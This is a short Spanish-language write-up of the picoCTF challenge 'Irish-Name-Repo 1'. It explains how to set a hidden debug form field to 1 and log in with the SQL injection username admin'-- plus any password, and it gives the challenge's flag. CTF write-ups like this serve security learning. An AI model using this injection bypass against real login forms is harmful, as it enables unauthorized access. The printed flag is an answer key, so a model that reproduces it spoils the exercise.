**Reto:** Irish-Name-Repo 1

**Descripción:**
Hay un sitio web en funcionamiento en `https://jupiter.challenges.picoctf.org/problem/50009/`( [enlace](https://jupiter.challenges.picoctf.org/problem/50009/) ) o http://jupiter.challenges.picoctf.org:50009. ¿Crees que puedes iniciar sesión? ¡Intenta ver si puedes!

**Solución:**
inspeccionamos el codigo del boton login
input type="hidden" name="debug" value="0"
y cambiamos el valor a 1 
input type="hidden" name="debug" value="1"

username:
admin'--
Password:
la_que_sea

# Logged in!

Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}

**Notas adicionales:**

**Referencias:** 
https://youtu.be/0EDbUSDqrng?si=W9WxGfIW6UQ2jQ0d
